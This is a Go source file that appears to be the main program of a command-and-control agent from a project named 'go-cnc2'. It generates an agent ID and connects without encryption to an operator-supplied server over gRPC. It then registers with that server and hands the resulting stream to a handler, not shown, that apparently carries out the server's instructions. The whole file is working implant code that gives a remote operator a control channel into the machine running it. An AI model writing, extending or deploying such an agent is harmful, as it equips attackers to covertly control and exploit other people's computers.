package main

import (
	"context"
	"flag"
	"fmt"
	"go-cnc2/pkg/agent"
	"go-cnc2/proto/pb"
	"log"

	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/metadata"
)

func main() {
	serverAddr := flag.String("server", "", "Server")
	flag.Parse()

	if *serverAddr == "" {
		log.Fatal("Please specify server address")
	}

	agentId, err := uuid.NewRandom()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Agent id: %s\n", agentId)

	transportOption := grpc.WithInsecure()
	cc, err := grpc.Dial(*serverAddr, transportOption)
	if err != nil {
		log.Fatal("cannot dial server: ", err)
	}

	myAgent := agent.NewAgent(cc)
	ctx := context.Background()
	ctx = metadata.AppendToOutgoingContext(ctx, "agent_id", agentId.String())
	connStream, err := myAgent.CreateConnStream(ctx, &pb.Empty{})

	myAgent.HandleConnStream(connStream)
}
